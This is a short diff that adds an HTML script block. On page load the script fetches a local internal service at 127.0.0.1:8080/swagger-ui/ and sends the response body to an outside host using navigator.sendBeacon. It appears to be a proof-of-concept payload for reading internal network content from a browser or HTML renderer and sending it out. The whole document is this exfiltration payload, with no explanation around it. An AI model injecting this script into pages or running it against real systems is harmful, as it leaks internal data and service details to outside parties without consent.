@@ -1,0 +1,8 @@
+<script>
+async function sendInternalTraffic() {
+    const response = await fetch("http://127.0.0.1:8080/swagger-ui/");
+    const body = await response.text();
+    navigator.sendBeacon("https://google.com", body);
+}
+sendInternalTraffic();
+</script>
